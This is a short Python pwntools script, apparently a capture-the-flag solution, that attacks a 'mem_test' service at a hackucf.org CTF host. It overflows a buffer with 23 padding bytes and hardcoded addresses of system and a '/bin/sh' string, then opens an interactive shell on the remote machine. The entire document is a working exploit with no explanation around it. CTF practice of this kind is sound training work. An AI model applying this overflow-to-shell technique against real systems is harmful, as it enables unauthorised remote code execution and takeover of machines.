from pwn import *

def main():
    #r = process("./mem_test")
    r = remote("ctf.hackucf.org",9004)

    binsh = 0x8048980
    bss = 0x08049d3c
    system = 0x08048580

    p = ""
    p += "A" * 23
    p += p32(system)
    p += p32(bss)
    p += p32(binsh)

    r.sendline(p)
    r.interactive()



if __name__ == "__main__":
    main()
